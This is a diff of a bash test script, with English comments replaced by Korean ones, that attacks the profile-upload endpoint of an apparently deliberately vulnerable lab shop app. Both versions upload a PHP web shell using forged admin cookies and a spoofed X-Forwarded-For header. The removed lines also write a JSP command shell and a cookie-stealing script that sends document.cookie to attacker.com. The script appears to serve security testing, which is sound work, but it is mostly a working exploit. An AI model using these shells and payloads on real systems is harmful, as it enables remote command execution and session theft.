@@ -1,46 +1,46 @@
 #!/bin/bash
-# Unrestricted File Upload Test Script
-# Target: VULN SHOP Profile Upload
+# 파일 업로드 취약점 테스트 스크립트
+# 사용법: ./file-upload.sh [file_path]
 
-TARGET="http://10.210.136.53:3000"
+TARGET="http://192.168.0.28:3000"
 MY_IP="10.0.0.101"
 
-echo "[*] Unrestricted File Upload Test"
-echo "[*] Target: $TARGET/profile/upload"
+echo "[*] 파일 업로드 취약점 테스트"
+echo "[*] 타겟: $TARGET/profile/upload"
 echo ""
 
-# Create test files
-echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
-echo '<script>document.location="http://attacker.com/steal?c="+document.cookie</script>' > /tmp/xss.html
-echo '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' > /tmp/shell.jsp
+# 테스트용 PHP 웹쉘 생성
+SHELL_FILE="/tmp/test-shell.php"
+echo '<?php echo "Vulnerable!"; system($_GET["cmd"]); ?>' > "$SHELL_FILE"
 
-files=("/tmp/shell.php" "/tmp/xss.html" "/tmp/shell.jsp")
+echo "[1] PHP 웹쉘 업로드 시도..."
+UPLOAD_RESULT=$(curl -s -X POST \
+    -H "X-Forwarded-For: $MY_IP" \
+    -H "Cookie: user=admin; isAdmin=true; user_id=1" \
+    -F "profile_image=@$SHELL_FILE;type=image/jpeg" \
+    "$TARGET/profile/upload")
 
-for file in "${files[@]}"; do
-    filename=$(basename "$file")
-    echo "[*] Uploading: $filename"
+echo "[2] 업로드된 파일 확인..."
+PROFILE=$(curl -s -H "X-Forwarded-For: $MY_IP" \
+    -H "Cookie: user=admin; isAdmin=true; user_id=1" \
+    "$TARGET/profile")
 
-    response=$(curl -s -H "X-Forwarded-For: $MY_IP" \
-        -H "Cookie: user=admin; isAdmin=true; user_id=1" \
-        -F "profile_image=@$file" \
-        "$TARGET/profile/upload" -i 2>&1)
+UPLOADED_PATH=$(echo "$PROFILE" | grep -oP 'src="/uploads/[^"]+' | sed 's/src="//')
 
-    if echo "$response" | grep -q "200"; then
-        echo "[+] Upload successful"
-
-        # Try to access uploaded file
-        echo "[*] Accessing: $TARGET/uploads/$filename"
-        uploaded=$(curl -s -H "X-Forwarded-For: $MY_IP" "$TARGET/uploads/$filename" 2>&1)
-
-        if [ -n "$uploaded" ] && [ "$uploaded" != *"Cannot GET"* ]; then
-            echo "[+] File accessible!"
-            echo "Content: ${uploaded:0:100}..."
-        fi
-    else
-        echo "[-] Upload failed"
-    fi
+if [ -n "$UPLOADED_PATH" ]; then
+    echo "[+] 업로드 성공: $UPLOADED_PATH"
     echo ""
-done
+    echo "[3] 업로드된 파일 내용 확인..."
+    CONTENT=$(curl -s -H "X-Forwarded-For: $MY_IP" "$TARGET$UPLOADED_PATH")
+    echo "$CONTENT"
 
-# Cleanup
-rm -f /tmp/shell.php /tmp/xss.html /tmp/shell.jsp
+    if echo "$CONTENT" | grep -q "system"; then
+        echo ""
+        echo "[+] 위험! 악성 파일이 필터링 없이 업로드되었습니다."
+    fi
+else
+    echo "[-] 업로드 경로를 찾을 수 없습니다."
+fi
+
+# 정리
+rm -f "$SHELL_FILE"
